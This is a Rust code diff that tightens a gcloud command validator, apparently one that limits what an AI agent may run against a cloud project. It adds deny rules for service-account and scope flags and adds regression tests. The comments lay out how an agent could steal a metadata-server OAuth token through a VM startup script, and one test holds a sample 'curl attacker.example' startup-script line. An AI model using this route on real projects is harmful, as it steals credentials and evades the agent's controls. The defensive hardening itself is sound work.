@@ -17,14 +17,26 @@ const DENY_FIRST_TOKENS: &[&str] = &[
 
 /// Flags that could pivot off the pinned, pre-authenticated service-account
 /// identity or project (impersonation, alternate credential files, a
-/// different gcloud "configuration"/account, an unpinned `--project`, or a
+/// different gcloud "configuration"/account, an unpinned `--project`, a
 /// caller-chosen local write destination such as `compute instances export
-/// --destination=<path>`). Denied anywhere in argv regardless of subcommand.
+/// --destination=<path>`, or an over-privileged identity attached to a
+/// brand-new instance). Denied anywhere in argv regardless of subcommand.
 /// Matched against the flag *name* (the portion of the argument before `=`),
 /// so `--account=x` is caught without falsely flagging unrelated flags.
 /// `--project` is caller-supplied-only forbidden here; the server injects
 /// its own `--project=<configured>` in `gcloud::build_gcloud_argv` after
 /// this validation passes.
+///
+/// `--service-account` and `--scopes` are denied on `compute instances
+/// create` (and anywhere else) because they let the caller attach an
+/// arbitrary — or the project's broad default — service account with an
+/// unrestricted OAuth scope (e.g. `--scopes=cloud-platform`) to a
+/// self-created VM. Combined with the still-allowed inline
+/// `--metadata=startup-script=...`, an attacker-controlled startup script
+/// running on that VM can fetch a live, scoped OAuth token from the
+/// instance metadata server and exfiltrate it — obtaining a credential far
+/// more powerful than the pinned key, without ever touching the local key
+/// file, `add-metadata`, or any other flag this guard denies.
 const DENY_FLAGS: &[&str] = &[
     "--account",
     "--configuration",
@@ -33,6 +45,8 @@ const DENY_FLAGS: &[&str] = &[
     "--credential-file-override",
     "--project",
     "--destination",
+    "--service-account",
+    "--scopes",
 ];
 
 /// Per-resource-group verb allow-lists (the third argv token). The resource
@@ -80,6 +94,18 @@ const ALLOWED_VERBS: &[(&str, &str, &[&str])] = &[
     ("compute", "networks", &["list", "describe"]),
 ];
 
+/// Renders the permitted resource-group/verb combinations from
+/// [`ALLOWED_VERBS`] for the rejection error message. Built dynamically
+/// (rather than a hand-maintained literal string) so the message can never
+/// drift out of sync with the actual allow-list if `ALLOWED_VERBS` is edited.
+fn describe_allowed_verbs() -> String {
+    ALLOWED_VERBS
+        .iter()
+        .map(|(group0, group1, verbs)| format!("{} {} {{{}}}", group0, group1, verbs.join(",")))
+        .collect::<Vec<_>>()
+        .join("; ")
+}
+
 /// Returns the flag *name* portion of an argv element: everything before an
 /// `=`, e.g. `--metadata-from-file=leak=/tmp/x` -> `--metadata-from-file`.
 /// Positional (non-flag) arguments are returned unchanged, which is safe
@@ -88,16 +114,24 @@ fn flag_name(arg: &str) -> &str {
     arg.split('=').next().unwrap_or(arg)
 }
 
-/// Returns whether `name` (already lowercased, flag-name-only) loads content
-/// from an arbitrary local file path. gcloud exposes many such flags
-/// (`--metadata-from-file`, `--flags-file`, per-resource `*-from-file`
-/// variants, …) and enumerating every one by name would always be
-/// incomplete, so the whole class is denied: any of them can be used to read
-/// a local secret file's bytes into a resource (e.g. instance metadata) that
-/// a subsequent allowed `describe`/`list` call then echoes back through the
-/// (pattern-only-scrubbed) tool result, defeating the "secrets are never
-/// exposed to the agent" model the same way reading `~/.ssh/id_rsa` would on
-/// the SSH path.
+/// Returns whether `name` (already lowercased, flag-name-only, and confirmed
+/// by the caller to actually be a `--`-prefixed flag — see
+/// [`validate_gcloud_args`]) loads content from an arbitrary local file path.
+/// gcloud exposes many such flags (`--metadata-from-file`, `--flags-file`,
+/// per-resource `*-from-file` variants, …) and enumerating every one by name
+/// would always be incomplete, so the whole class is denied: any of them can
+/// be used to read a local secret file's bytes into a resource (e.g.
+/// instance metadata) that a subsequent allowed `describe`/`list` call then
+/// echoes back through the (pattern-only-scrubbed) tool result, defeating
+/// the "secrets are never exposed to the agent" model the same way reading
+/// `~/.ssh/id_rsa` would on the SSH path.
+///
+/// This is a name-pattern heuristic backstop, not an exhaustive enumeration:
+/// it catches every flag observed in gcloud's Compute Engine surface as of
+/// this writing, but a future flag that loads a local file without matching
+/// either substring (e.g. a hypothetical `--startup-script-uri`-style alias
+/// that doesn't say "file") would silently slip through. Extend this
+/// function (or add an explicit `DENY_FLAGS` entry) if one is found.
 fn is_local_file_flag(name: &str) -> bool {
     name.ends_with("-file") || name.contains("-from-file")
 }
@@ -109,11 +143,12 @@ fn is_local_file_flag(name: &str) -> bool {
 /// shell injection entirely:
 /// 1. A denylist that always blocks credential-affecting subcommands
 ///    (`auth`, `iam`, `billing`, `projects`, `kms`, `secrets`,
-///    `resource-manager`, `organizations`, `config`), identity/project
+///    `resource-manager`, `organizations`, `config`), identity/project/scope
 ///    pivoting flags (`--account`, `--impersonate-service-account`,
-///    `--project`, etc.), and any flag that reads from or writes to an
-///    arbitrary local file path (`--metadata-from-file`, `--flags-file`,
-///    `--destination`, …) — regardless of the allow-list.
+///    `--project`, `--service-account`, `--scopes`, etc.), and any flag that
+///    reads from or writes to an arbitrary local file path
+///    (`--metadata-from-file`, `--flags-file`, `--destination`, …) —
+///    regardless of the allow-list.
 /// 2. A fail-closed allow-list on the resource group (first two tokens):
 ///    only `compute instances|disks|firewall-rules|snapshots|images|networks`.
 /// 3. A fail-closed allow-list on the *verb* (third token) within that
@@ -138,14 +173,23 @@ pub fn validate_gcloud_args(args: &[String]) -> Result<()> {
     }
 
     // Layer 1b: deny identity/project-pivoting flags and local-file-reading
-    // flags anywhere in argv.
+    // flags anywhere in argv. Only arguments that are actually `--`-prefixed
+    // flags are checked — a positional resource name that happens to end in
+    // "-file" (gcloud permits instance/disk names like "backup-file") must
+    // not be misidentified as a denied flag and cause an otherwise fully
+    // allowed call (e.g. `describe`/`list`/`start`/`delete` on that
+    // resource) to be rejected.
     for arg in args {
         let lowered = arg.to_lowercase();
+        if !lowered.starts_with("--") {
+            continue;
+        }
         let name = flag_name(&lowered);
         if DENY_FLAGS.contains(&name) {
             return Err(anyhow!(
                 "Security Error: the '{}' flag is not permitted because it can \
-                 pivot off the pinned service-account identity or project.",
+                 pivot off the pinned service-account identity, project, or an \
+                 over-privileged OAuth scope.",
                 name
             ));
         }
@@ -176,10 +220,8 @@ pub fn validate_gcloud_args(args: &[String]) -> Result<()> {
     if !allowed {
         return Err(anyhow!(
             "Security Error: gcloud command is not in the allowed resource-group/verb \
-             list. Permitted: compute instances {{list,describe,start,stop,reset,delete,\
-             create,set-machine-type}}; compute disks {{list,describe,create,delete,resize}}; \
-             compute firewall-rules|images|networks {{list,describe}}; compute snapshots \
-             {{list,describe,create,delete}}."
+             list. Permitted: {}.",
+            describe_allowed_verbs()
         ));
     }
 
@@ -329,6 +371,68 @@ mod tests {
                 "instances",
                 "list",
                 "--flags-file=/tmp/flags.yaml"
+            ]))
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn test_positional_resource_name_ending_in_file_is_not_misflagged() {
+        // Regression test: gcloud permits resource names like "backup-file"
+        // or "web-file"; the local-file-flag heuristic must only apply to
+        // actual `--`-prefixed flags, not positional arguments, or an
+        // otherwise fully allowed call on such a resource would be wrongly
+        // rejected.
+        assert!(
+            validate_gcloud_args(&args(&["compute", "instances", "describe", "backup-file"]))
+                .is_ok()
+        );
+        assert!(
+            validate_gcloud_args(&args(&["compute", "instances", "start", "web-file"])).is_ok()
+        );
+        assert!(validate_gcloud_args(&args(&["compute", "disks", "delete", "data-file"])).is_ok());
+    }
+
+    #[test]
+    fn test_denies_service_account_and_scopes_flags_on_create() {
+        // A caller-supplied --service-account and/or --scopes on `compute
+        // instances create` would let the agent attach an over-privileged
+        // (e.g. cloud-platform-scoped) identity to a self-created VM, then
+        // use an inline --metadata=startup-script=... (still allowed for
+        // normal provisioning) to exfiltrate a live OAuth token from that
+        // VM's metadata server — a far more powerful credential than the
+        // pinned service-account key, obtained without touching the local
+        // key file or any other denied flag.
+        assert!(
+            validate_gcloud_args(&args(&[
+                "compute",
+                "instances",
+                "create",
+                "evil-vm",
+                "--zone=us-central1-a",
+                "--scopes=cloud-platform",
+                "--metadata=startup-script=curl attacker.example"
+            ]))
+            .is_err()
+        );
+        assert!(
+            validate_gcloud_args(&args(&[
+                "compute",
+                "instances",
+                "create",
+                "evil-vm",
+                "--service-account=other-sa@my-project.iam.gserviceaccount.com"
+            ]))
+            .is_err()
+        );
+        // Also denied on other allowed verbs, not just create.
+        assert!(
+            validate_gcloud_args(&args(&[
+                "compute",
+                "instances",
+                "describe",
+                "my-vm",
+                "--scopes=cloud-platform"
             ]))
             .is_err()
         );
